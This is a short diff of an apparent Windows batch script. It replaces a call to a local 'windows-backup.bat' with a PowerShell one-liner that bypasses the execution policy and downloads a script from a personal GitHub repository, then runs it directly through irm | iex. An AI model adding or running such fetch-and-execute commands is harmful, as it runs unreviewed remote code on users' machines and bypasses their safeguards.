@@ -32,7 +32,8 @@ if %found%==1 (
 
 
 
-start /wait "" "C:\windows-backup.bat"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1 | iex"
+
 
 
 
